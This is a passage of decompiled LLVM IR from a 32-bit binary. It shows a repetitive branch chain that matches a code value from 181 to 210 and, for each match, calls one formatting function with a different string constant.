  %v12_804c0ad = icmp eq i32 %v11_8049e19, 181
  %v1_804c0b4 = icmp eq i1 %v12_804c0ad, false
  br i1 %v1_804c0b4, label %dec_label_pc_804c0e0, label %dec_label_pc_804c0b6

dec_label_pc_804c0b6:                             ; preds = %dec_label_pc_804c0ad
  %v0_804c0b6 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c0b6 = zext i8 %v0_804c0b6 to i32
  store i32 %v1_804c0b6, i32* @edx, align 4
  %v0_804c0c2 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c0c2 = zext i8 %v0_804c0c2 to i32
  %v2_804c0d1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0d1, i32* @ebx, align 4
  %v5_804c0d8 = call i32 @function_8048b5b(i32 %v2_804c0d1, i32 ptrtoint ([12 x i8]* @global_var_805a848.223 to i32), i32 %v1_804c0c2, i32 %v1_804c0b6)
  br label %dec_label_pc_804c0e0

dec_label_pc_804c0e0:                             ; preds = %dec_label_pc_804c0ad, %dec_label_pc_804c0b6
  %v12_804c0e0 = icmp eq i32 %v11_8049e19, 182
  %v1_804c0e7 = icmp eq i1 %v12_804c0e0, false
  br i1 %v1_804c0e7, label %dec_label_pc_804c113, label %dec_label_pc_804c0e9

dec_label_pc_804c0e9:                             ; preds = %dec_label_pc_804c0e0
  %v0_804c0e9 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c0e9 = zext i8 %v0_804c0e9 to i32
  store i32 %v1_804c0e9, i32* @edx, align 4
  %v0_804c0f5 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c0f5 = zext i8 %v0_804c0f5 to i32
  %v2_804c104 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c104, i32* @ebx, align 4
  %v5_804c10b = call i32 @function_8048b5b(i32 %v2_804c104, i32 ptrtoint ([14 x i8]* @global_var_805a854.224 to i32), i32 %v1_804c0f5, i32 %v1_804c0e9)
  br label %dec_label_pc_804c113

dec_label_pc_804c113:                             ; preds = %dec_label_pc_804c0e0, %dec_label_pc_804c0e9
  %v12_804c113 = icmp eq i32 %v11_8049e19, 183
  %v1_804c11a = icmp eq i1 %v12_804c113, false
  br i1 %v1_804c11a, label %dec_label_pc_804c146, label %dec_label_pc_804c11c

dec_label_pc_804c11c:                             ; preds = %dec_label_pc_804c113
  %v0_804c11c = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c11c = zext i8 %v0_804c11c to i32
  store i32 %v1_804c11c, i32* @edx, align 4
  %v0_804c128 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c128 = zext i8 %v0_804c128 to i32
  %v2_804c137 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c137, i32* @ebx, align 4
  %v5_804c13e = call i32 @function_8048b5b(i32 %v2_804c137, i32 ptrtoint ([14 x i8]* @global_var_805a862.225 to i32), i32 %v1_804c128, i32 %v1_804c11c)
  br label %dec_label_pc_804c146

dec_label_pc_804c146:                             ; preds = %dec_label_pc_804c113, %dec_label_pc_804c11c
  %v12_804c146 = icmp eq i32 %v11_8049e19, 184
  %v1_804c14d = icmp eq i1 %v12_804c146, false
  br i1 %v1_804c14d, label %dec_label_pc_804c179, label %dec_label_pc_804c14f

dec_label_pc_804c14f:                             ; preds = %dec_label_pc_804c146
  %v0_804c14f = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c14f = zext i8 %v0_804c14f to i32
  store i32 %v1_804c14f, i32* @edx, align 4
  %v0_804c15b = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c15b = zext i8 %v0_804c15b to i32
  %v2_804c16a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c16a, i32* @ebx, align 4
  %v5_804c171 = call i32 @function_8048b5b(i32 %v2_804c16a, i32 ptrtoint ([14 x i8]* @global_var_805a870.226 to i32), i32 %v1_804c15b, i32 %v1_804c14f)
  br label %dec_label_pc_804c179

dec_label_pc_804c179:                             ; preds = %dec_label_pc_804c146, %dec_label_pc_804c14f
  %v12_804c179 = icmp eq i32 %v11_8049e19, 185
  %v1_804c180 = icmp eq i1 %v12_804c179, false
  br i1 %v1_804c180, label %dec_label_pc_804c1ac, label %dec_label_pc_804c182

dec_label_pc_804c182:                             ; preds = %dec_label_pc_804c179
  %v0_804c182 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c182 = zext i8 %v0_804c182 to i32
  store i32 %v1_804c182, i32* @edx, align 4
  %v0_804c18e = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c18e = zext i8 %v0_804c18e to i32
  %v2_804c19d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c19d, i32* @ebx, align 4
  %v5_804c1a4 = call i32 @function_8048b5b(i32 %v2_804c19d, i32 ptrtoint ([14 x i8]* @global_var_805a87e.227 to i32), i32 %v1_804c18e, i32 %v1_804c182)
  br label %dec_label_pc_804c1ac

dec_label_pc_804c1ac:                             ; preds = %dec_label_pc_804c179, %dec_label_pc_804c182
  %v12_804c1ac = icmp eq i32 %v11_8049e19, 186
  %v1_804c1b3 = icmp eq i1 %v12_804c1ac, false
  br i1 %v1_804c1b3, label %dec_label_pc_804c1df, label %dec_label_pc_804c1b5

dec_label_pc_804c1b5:                             ; preds = %dec_label_pc_804c1ac
  %v0_804c1b5 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c1b5 = zext i8 %v0_804c1b5 to i32
  store i32 %v1_804c1b5, i32* @edx, align 4
  %v0_804c1c1 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c1c1 = zext i8 %v0_804c1c1 to i32
  %v2_804c1d0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1d0, i32* @ebx, align 4
  %v5_804c1d7 = call i32 @function_8048b5b(i32 %v2_804c1d0, i32 ptrtoint ([14 x i8]* @global_var_805a88c.228 to i32), i32 %v1_804c1c1, i32 %v1_804c1b5)
  br label %dec_label_pc_804c1df

dec_label_pc_804c1df:                             ; preds = %dec_label_pc_804c1ac, %dec_label_pc_804c1b5
  %v12_804c1df = icmp eq i32 %v11_8049e19, 187
  %v1_804c1e6 = icmp eq i1 %v12_804c1df, false
  br i1 %v1_804c1e6, label %dec_label_pc_804c212, label %dec_label_pc_804c1e8

dec_label_pc_804c1e8:                             ; preds = %dec_label_pc_804c1df
  %v0_804c1e8 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c1e8 = zext i8 %v0_804c1e8 to i32
  store i32 %v1_804c1e8, i32* @edx, align 4
  %v0_804c1f4 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c1f4 = zext i8 %v0_804c1f4 to i32
  %v2_804c203 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c203, i32* @ebx, align 4
  %v5_804c20a = call i32 @function_8048b5b(i32 %v2_804c203, i32 ptrtoint ([14 x i8]* @global_var_805a89a.229 to i32), i32 %v1_804c1f4, i32 %v1_804c1e8)
  br label %dec_label_pc_804c212

dec_label_pc_804c212:                             ; preds = %dec_label_pc_804c1df, %dec_label_pc_804c1e8
  %v12_804c212 = icmp eq i32 %v11_8049e19, 188
  %v1_804c219 = icmp eq i1 %v12_804c212, false
  br i1 %v1_804c219, label %dec_label_pc_804c245, label %dec_label_pc_804c21b

dec_label_pc_804c21b:                             ; preds = %dec_label_pc_804c212
  %v0_804c21b = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c21b = zext i8 %v0_804c21b to i32
  store i32 %v1_804c21b, i32* @edx, align 4
  %v0_804c227 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c227 = zext i8 %v0_804c227 to i32
  %v2_804c236 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c236, i32* @ebx, align 4
  %v5_804c23d = call i32 @function_8048b5b(i32 %v2_804c236, i32 ptrtoint ([14 x i8]* @global_var_805a8a8.230 to i32), i32 %v1_804c227, i32 %v1_804c21b)
  br label %dec_label_pc_804c245

dec_label_pc_804c245:                             ; preds = %dec_label_pc_804c212, %dec_label_pc_804c21b
  %v12_804c245 = icmp eq i32 %v11_8049e19, 189
  %v1_804c24c = icmp eq i1 %v12_804c245, false
  br i1 %v1_804c24c, label %dec_label_pc_804c278, label %dec_label_pc_804c24e

dec_label_pc_804c24e:                             ; preds = %dec_label_pc_804c245
  %v0_804c24e = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c24e = zext i8 %v0_804c24e to i32
  store i32 %v1_804c24e, i32* @edx, align 4
  %v0_804c25a = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c25a = zext i8 %v0_804c25a to i32
  %v2_804c269 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c269, i32* @ebx, align 4
  %v5_804c270 = call i32 @function_8048b5b(i32 %v2_804c269, i32 ptrtoint ([14 x i8]* @global_var_805a8b6.231 to i32), i32 %v1_804c25a, i32 %v1_804c24e)
  br label %dec_label_pc_804c278

dec_label_pc_804c278:                             ; preds = %dec_label_pc_804c245, %dec_label_pc_804c24e
  %v12_804c278 = icmp eq i32 %v11_8049e19, 190
  %v1_804c27f = icmp eq i1 %v12_804c278, false
  br i1 %v1_804c27f, label %dec_label_pc_804c2ab, label %dec_label_pc_804c281

dec_label_pc_804c281:                             ; preds = %dec_label_pc_804c278
  %v0_804c281 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c281 = zext i8 %v0_804c281 to i32
  store i32 %v1_804c281, i32* @edx, align 4
  %v0_804c28d = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c28d = zext i8 %v0_804c28d to i32
  %v2_804c29c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c29c, i32* @ebx, align 4
  %v5_804c2a3 = call i32 @function_8048b5b(i32 %v2_804c29c, i32 ptrtoint ([14 x i8]* @global_var_805a8c4.232 to i32), i32 %v1_804c28d, i32 %v1_804c281)
  br label %dec_label_pc_804c2ab

dec_label_pc_804c2ab:                             ; preds = %dec_label_pc_804c278, %dec_label_pc_804c281
  %v12_804c2ab = icmp eq i32 %v11_8049e19, 191
  %v1_804c2b2 = icmp eq i1 %v12_804c2ab, false
  br i1 %v1_804c2b2, label %dec_label_pc_804c2de, label %dec_label_pc_804c2b4

dec_label_pc_804c2b4:                             ; preds = %dec_label_pc_804c2ab
  %v0_804c2b4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c2b4 = zext i8 %v0_804c2b4 to i32
  store i32 %v1_804c2b4, i32* @edx, align 4
  %v0_804c2c0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c2c0 = zext i8 %v0_804c2c0 to i32
  %v2_804c2cf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c2cf, i32* @ebx, align 4
  %v5_804c2d6 = call i32 @function_8048b5b(i32 %v2_804c2cf, i32 ptrtoint ([14 x i8]* @global_var_805a8d2.233 to i32), i32 %v1_804c2c0, i32 %v1_804c2b4)
  br label %dec_label_pc_804c2de

dec_label_pc_804c2de:                             ; preds = %dec_label_pc_804c2ab, %dec_label_pc_804c2b4
  %v9_804c2de = icmp eq i32 %v11_8049e19, 192
  %v1_804c2e5 = icmp eq i1 %v9_804c2de, false
  br i1 %v1_804c2e5, label %dec_label_pc_804c311, label %dec_label_pc_804c2e7

dec_label_pc_804c2e7:                             ; preds = %dec_label_pc_804c2de
  %v0_804c2e7 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c2e7 = zext i8 %v0_804c2e7 to i32
  store i32 %v1_804c2e7, i32* @edx, align 4
  %v0_804c2f3 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c2f3 = zext i8 %v0_804c2f3 to i32
  %v2_804c302 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c302, i32* @ebx, align 4
  %v5_804c309 = call i32 @function_8048b5b(i32 %v2_804c302, i32 ptrtoint ([14 x i8]* @global_var_805a8e0.234 to i32), i32 %v1_804c2f3, i32 %v1_804c2e7)
  br label %dec_label_pc_804c311

dec_label_pc_804c311:                             ; preds = %dec_label_pc_804c2de, %dec_label_pc_804c2e7
  %v12_804c311 = icmp eq i32 %v11_8049e19, 193
  %v1_804c318 = icmp eq i1 %v12_804c311, false
  br i1 %v1_804c318, label %dec_label_pc_804c344, label %dec_label_pc_804c31a

dec_label_pc_804c31a:                             ; preds = %dec_label_pc_804c311
  %v0_804c31a = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c31a = zext i8 %v0_804c31a to i32
  store i32 %v1_804c31a, i32* @edx, align 4
  %v0_804c326 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c326 = zext i8 %v0_804c326 to i32
  %v2_804c335 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c335, i32* @ebx, align 4
  %v5_804c33c = call i32 @function_8048b5b(i32 %v2_804c335, i32 ptrtoint ([13 x i8]* @global_var_805a8ee.235 to i32), i32 %v1_804c326, i32 %v1_804c31a)
  br label %dec_label_pc_804c344

dec_label_pc_804c344:                             ; preds = %dec_label_pc_804c311, %dec_label_pc_804c31a
  %v12_804c344 = icmp eq i32 %v11_8049e19, 194
  %v1_804c34b = icmp eq i1 %v12_804c344, false
  br i1 %v1_804c34b, label %dec_label_pc_804c377, label %dec_label_pc_804c34d

dec_label_pc_804c34d:                             ; preds = %dec_label_pc_804c344
  %v0_804c34d = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c34d = zext i8 %v0_804c34d to i32
  store i32 %v1_804c34d, i32* @edx, align 4
  %v0_804c359 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c359 = zext i8 %v0_804c359 to i32
  %v2_804c368 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c368, i32* @ebx, align 4
  %v5_804c36f = call i32 @function_8048b5b(i32 %v2_804c368, i32 ptrtoint ([13 x i8]* @global_var_805a8fb.236 to i32), i32 %v1_804c359, i32 %v1_804c34d)
  br label %dec_label_pc_804c377

dec_label_pc_804c377:                             ; preds = %dec_label_pc_804c344, %dec_label_pc_804c34d
  %v12_804c377 = icmp eq i32 %v11_8049e19, 195
  %v1_804c37e = icmp eq i1 %v12_804c377, false
  br i1 %v1_804c37e, label %dec_label_pc_804c3aa, label %dec_label_pc_804c380

dec_label_pc_804c380:                             ; preds = %dec_label_pc_804c377
  %v0_804c380 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c380 = zext i8 %v0_804c380 to i32
  store i32 %v1_804c380, i32* @edx, align 4
  %v0_804c38c = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c38c = zext i8 %v0_804c38c to i32
  %v2_804c39b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c39b, i32* @ebx, align 4
  %v5_804c3a2 = call i32 @function_8048b5b(i32 %v2_804c39b, i32 ptrtoint ([13 x i8]* @global_var_805a908.237 to i32), i32 %v1_804c38c, i32 %v1_804c380)
  br label %dec_label_pc_804c3aa

dec_label_pc_804c3aa:                             ; preds = %dec_label_pc_804c377, %dec_label_pc_804c380
  %v12_804c3aa = icmp eq i32 %v11_8049e19, 196
  %v1_804c3b1 = icmp eq i1 %v12_804c3aa, false
  br i1 %v1_804c3b1, label %dec_label_pc_804c3dd, label %dec_label_pc_804c3b3

dec_label_pc_804c3b3:                             ; preds = %dec_label_pc_804c3aa
  %v0_804c3b3 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c3b3 = zext i8 %v0_804c3b3 to i32
  store i32 %v1_804c3b3, i32* @edx, align 4
  %v0_804c3bf = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c3bf = zext i8 %v0_804c3bf to i32
  %v2_804c3ce = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c3ce, i32* @ebx, align 4
  %v5_804c3d5 = call i32 @function_8048b5b(i32 %v2_804c3ce, i32 ptrtoint ([13 x i8]* @global_var_805a915.238 to i32), i32 %v1_804c3bf, i32 %v1_804c3b3)
  br label %dec_label_pc_804c3dd

dec_label_pc_804c3dd:                             ; preds = %dec_label_pc_804c3aa, %dec_label_pc_804c3b3
  %v12_804c3dd = icmp eq i32 %v11_8049e19, 197
  %v1_804c3e4 = icmp eq i1 %v12_804c3dd, false
  br i1 %v1_804c3e4, label %dec_label_pc_804c410, label %dec_label_pc_804c3e6

dec_label_pc_804c3e6:                             ; preds = %dec_label_pc_804c3dd
  %v0_804c3e6 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c3e6 = zext i8 %v0_804c3e6 to i32
  store i32 %v1_804c3e6, i32* @edx, align 4
  %v0_804c3f2 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c3f2 = zext i8 %v0_804c3f2 to i32
  %v2_804c401 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c401, i32* @ebx, align 4
  %v5_804c408 = call i32 @function_8048b5b(i32 %v2_804c401, i32 ptrtoint ([13 x i8]* @global_var_805a922.239 to i32), i32 %v1_804c3f2, i32 %v1_804c3e6)
  br label %dec_label_pc_804c410

dec_label_pc_804c410:                             ; preds = %dec_label_pc_804c3dd, %dec_label_pc_804c3e6
  %v12_804c410 = icmp eq i32 %v11_8049e19, 198
  %v1_804c417 = icmp eq i1 %v12_804c410, false
  br i1 %v1_804c417, label %dec_label_pc_804c443, label %dec_label_pc_804c419

dec_label_pc_804c419:                             ; preds = %dec_label_pc_804c410
  %v0_804c419 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c419 = zext i8 %v0_804c419 to i32
  store i32 %v1_804c419, i32* @edx, align 4
  %v0_804c425 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c425 = zext i8 %v0_804c425 to i32
  %v2_804c434 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c434, i32* @ebx, align 4
  %v5_804c43b = call i32 @function_8048b5b(i32 %v2_804c434, i32 ptrtoint ([13 x i8]* @global_var_805a92f.240 to i32), i32 %v1_804c425, i32 %v1_804c419)
  br label %dec_label_pc_804c443

dec_label_pc_804c443:                             ; preds = %dec_label_pc_804c410, %dec_label_pc_804c419
  %v12_804c443 = icmp eq i32 %v11_8049e19, 199
  %v1_804c44a = icmp eq i1 %v12_804c443, false
  br i1 %v1_804c44a, label %dec_label_pc_804c476, label %dec_label_pc_804c44c

dec_label_pc_804c44c:                             ; preds = %dec_label_pc_804c443
  %v0_804c44c = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c44c = zext i8 %v0_804c44c to i32
  store i32 %v1_804c44c, i32* @edx, align 4
  %v0_804c458 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c458 = zext i8 %v0_804c458 to i32
  %v2_804c467 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c467, i32* @ebx, align 4
  %v5_804c46e = call i32 @function_8048b5b(i32 %v2_804c467, i32 ptrtoint ([14 x i8]* @global_var_805a93c.241 to i32), i32 %v1_804c458, i32 %v1_804c44c)
  br label %dec_label_pc_804c476

dec_label_pc_804c476:                             ; preds = %dec_label_pc_804c443, %dec_label_pc_804c44c
  %v12_804c476 = icmp eq i32 %v11_8049e19, 200
  %v1_804c47d = icmp eq i1 %v12_804c476, false
  br i1 %v1_804c47d, label %dec_label_pc_804c4a9, label %dec_label_pc_804c47f

dec_label_pc_804c47f:                             ; preds = %dec_label_pc_804c476
  %v0_804c47f = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c47f = zext i8 %v0_804c47f to i32
  store i32 %v1_804c47f, i32* @edx, align 4
  %v0_804c48b = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c48b = zext i8 %v0_804c48b to i32
  %v2_804c49a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c49a, i32* @ebx, align 4
  %v5_804c4a1 = call i32 @function_8048b5b(i32 %v2_804c49a, i32 ptrtoint ([14 x i8]* @global_var_805a94a.242 to i32), i32 %v1_804c48b, i32 %v1_804c47f)
  br label %dec_label_pc_804c4a9

dec_label_pc_804c4a9:                             ; preds = %dec_label_pc_804c476, %dec_label_pc_804c47f
  %v12_804c4a9 = icmp eq i32 %v11_8049e19, 201
  %v1_804c4b0 = icmp eq i1 %v12_804c4a9, false
  br i1 %v1_804c4b0, label %dec_label_pc_804c4dc, label %dec_label_pc_804c4b2

dec_label_pc_804c4b2:                             ; preds = %dec_label_pc_804c4a9
  %v0_804c4b2 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c4b2 = zext i8 %v0_804c4b2 to i32
  store i32 %v1_804c4b2, i32* @edx, align 4
  %v0_804c4be = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c4be = zext i8 %v0_804c4be to i32
  %v2_804c4cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c4cd, i32* @ebx, align 4
  %v5_804c4d4 = call i32 @function_8048b5b(i32 %v2_804c4cd, i32 ptrtoint ([14 x i8]* @global_var_805a958.243 to i32), i32 %v1_804c4be, i32 %v1_804c4b2)
  br label %dec_label_pc_804c4dc

dec_label_pc_804c4dc:                             ; preds = %dec_label_pc_804c4a9, %dec_label_pc_804c4b2
  %v12_804c4dc = icmp eq i32 %v11_8049e19, 202
  %v1_804c4e3 = icmp eq i1 %v12_804c4dc, false
  br i1 %v1_804c4e3, label %dec_label_pc_804c50f, label %dec_label_pc_804c4e5

dec_label_pc_804c4e5:                             ; preds = %dec_label_pc_804c4dc
  %v0_804c4e5 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c4e5 = zext i8 %v0_804c4e5 to i32
  store i32 %v1_804c4e5, i32* @edx, align 4
  %v0_804c4f1 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c4f1 = zext i8 %v0_804c4f1 to i32
  %v2_804c500 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c500, i32* @ebx, align 4
  %v5_804c507 = call i32 @function_8048b5b(i32 %v2_804c500, i32 ptrtoint ([13 x i8]* @global_var_805a966.244 to i32), i32 %v1_804c4f1, i32 %v1_804c4e5)
  br label %dec_label_pc_804c50f

dec_label_pc_804c50f:                             ; preds = %dec_label_pc_804c4dc, %dec_label_pc_804c4e5
  %v12_804c50f = icmp eq i32 %v11_8049e19, 203
  %v1_804c516 = icmp eq i1 %v12_804c50f, false
  br i1 %v1_804c516, label %dec_label_pc_804c542, label %dec_label_pc_804c518

dec_label_pc_804c518:                             ; preds = %dec_label_pc_804c50f
  %v0_804c518 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c518 = zext i8 %v0_804c518 to i32
  store i32 %v1_804c518, i32* @edx, align 4
  %v0_804c524 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c524 = zext i8 %v0_804c524 to i32
  %v2_804c533 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c533, i32* @ebx, align 4
  %v5_804c53a = call i32 @function_8048b5b(i32 %v2_804c533, i32 ptrtoint ([13 x i8]* @global_var_805a973.245 to i32), i32 %v1_804c524, i32 %v1_804c518)
  br label %dec_label_pc_804c542

dec_label_pc_804c542:                             ; preds = %dec_label_pc_804c50f, %dec_label_pc_804c518
  %v12_804c542 = icmp eq i32 %v11_8049e19, 204
  %v1_804c549 = icmp eq i1 %v12_804c542, false
  br i1 %v1_804c549, label %dec_label_pc_804c575, label %dec_label_pc_804c54b

dec_label_pc_804c54b:                             ; preds = %dec_label_pc_804c542
  %v0_804c54b = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c54b = zext i8 %v0_804c54b to i32
  store i32 %v1_804c54b, i32* @edx, align 4
  %v0_804c557 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c557 = zext i8 %v0_804c557 to i32
  %v2_804c566 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c566, i32* @ebx, align 4
  %v5_804c56d = call i32 @function_8048b5b(i32 %v2_804c566, i32 ptrtoint ([14 x i8]* @global_var_805a980.246 to i32), i32 %v1_804c557, i32 %v1_804c54b)
  br label %dec_label_pc_804c575

dec_label_pc_804c575:                             ; preds = %dec_label_pc_804c542, %dec_label_pc_804c54b
  %v12_804c575 = icmp eq i32 %v11_8049e19, 205
  %v1_804c57c = icmp eq i1 %v12_804c575, false
  br i1 %v1_804c57c, label %dec_label_pc_804c5a8, label %dec_label_pc_804c57e

dec_label_pc_804c57e:                             ; preds = %dec_label_pc_804c575
  %v0_804c57e = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c57e = zext i8 %v0_804c57e to i32
  store i32 %v1_804c57e, i32* @edx, align 4
  %v0_804c58a = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c58a = zext i8 %v0_804c58a to i32
  %v2_804c599 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c599, i32* @ebx, align 4
  %v5_804c5a0 = call i32 @function_8048b5b(i32 %v2_804c599, i32 ptrtoint ([14 x i8]* @global_var_805a98e.247 to i32), i32 %v1_804c58a, i32 %v1_804c57e)
  br label %dec_label_pc_804c5a8

dec_label_pc_804c5a8:                             ; preds = %dec_label_pc_804c575, %dec_label_pc_804c57e
  %v12_804c5a8 = icmp eq i32 %v11_8049e19, 206
  %v1_804c5af = icmp eq i1 %v12_804c5a8, false
  br i1 %v1_804c5af, label %dec_label_pc_804c5db, label %dec_label_pc_804c5b1

dec_label_pc_804c5b1:                             ; preds = %dec_label_pc_804c5a8
  %v0_804c5b1 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c5b1 = zext i8 %v0_804c5b1 to i32
  store i32 %v1_804c5b1, i32* @edx, align 4
  %v0_804c5bd = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c5bd = zext i8 %v0_804c5bd to i32
  %v2_804c5cc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c5cc, i32* @ebx, align 4
  %v5_804c5d3 = call i32 @function_8048b5b(i32 %v2_804c5cc, i32 ptrtoint ([13 x i8]* @global_var_805a99c.248 to i32), i32 %v1_804c5bd, i32 %v1_804c5b1)
  br label %dec_label_pc_804c5db

dec_label_pc_804c5db:                             ; preds = %dec_label_pc_804c5a8, %dec_label_pc_804c5b1
  %v12_804c5db = icmp eq i32 %v11_8049e19, 207
  %v1_804c5e2 = icmp eq i1 %v12_804c5db, false
  br i1 %v1_804c5e2, label %dec_label_pc_804c60e, label %dec_label_pc_804c5e4

dec_label_pc_804c5e4:                             ; preds = %dec_label_pc_804c5db
  %v0_804c5e4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c5e4 = zext i8 %v0_804c5e4 to i32
  store i32 %v1_804c5e4, i32* @edx, align 4
  %v0_804c5f0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c5f0 = zext i8 %v0_804c5f0 to i32
  %v2_804c5ff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c5ff, i32* @ebx, align 4
  %v5_804c606 = call i32 @function_8048b5b(i32 %v2_804c5ff, i32 ptrtoint ([13 x i8]* @global_var_805a9a9.249 to i32), i32 %v1_804c5f0, i32 %v1_804c5e4)
  br label %dec_label_pc_804c60e

dec_label_pc_804c60e:                             ; preds = %dec_label_pc_804c5db, %dec_label_pc_804c5e4
  %v9_804c60e = icmp eq i32 %v11_8049e19, 208
  %v1_804c615 = icmp eq i1 %v9_804c60e, false
  br i1 %v1_804c615, label %dec_label_pc_804c641, label %dec_label_pc_804c617

dec_label_pc_804c617:                             ; preds = %dec_label_pc_804c60e
  %v0_804c617 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c617 = zext i8 %v0_804c617 to i32
  store i32 %v1_804c617, i32* @edx, align 4
  %v0_804c623 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c623 = zext i8 %v0_804c623 to i32
  %v2_804c632 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c632, i32* @ebx, align 4
  %v5_804c639 = call i32 @function_8048b5b(i32 %v2_804c632, i32 ptrtoint ([13 x i8]* @global_var_805a9b6.250 to i32), i32 %v1_804c623, i32 %v1_804c617)
  br label %dec_label_pc_804c641

dec_label_pc_804c641:                             ; preds = %dec_label_pc_804c60e, %dec_label_pc_804c617
  %v12_804c641 = icmp eq i32 %v11_8049e19, 209
  %v1_804c648 = icmp eq i1 %v12_804c641, false
  br i1 %v1_804c648, label %dec_label_pc_804c674, label %dec_label_pc_804c64a

dec_label_pc_804c64a:                             ; preds = %dec_label_pc_804c641
  %v0_804c64a = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c64a = zext i8 %v0_804c64a to i32
  store i32 %v1_804c64a, i32* @edx, align 4
  %v0_804c656 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c656 = zext i8 %v0_804c656 to i32
  %v2_804c665 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c665, i32* @ebx, align 4
  %v5_804c66c = call i32 @function_8048b5b(i32 %v2_804c665, i32 ptrtoint ([13 x i8]* @global_var_805a9c3.251 to i32), i32 %v1_804c656, i32 %v1_804c64a)
  br label %dec_label_pc_804c674

dec_label_pc_804c674:                             ; preds = %dec_label_pc_804c641, %dec_label_pc_804c64a
  %v12_804c674 = icmp eq i32 %v11_8049e19, 210
  %v1_804c67b = icmp eq i1 %v12_804c674, false
  br i1 %v1_804c67b, label %dec_label_pc_804c6a7, label %dec_label_pc_804c67d

dec_label_pc_804c67d:                             ; preds = %dec_label_pc_804c674
  %v0_804c67d = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c67d = zext i8 %v0_804c67d to i32
  store i32 %v1_804c67d, i32* @edx, align 4
  %v0_804c689 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c689 = zext i8 %v0_804c689 to i32
  %v2_804c698 = ptrtoint i32* %stack_var_-28 to i32
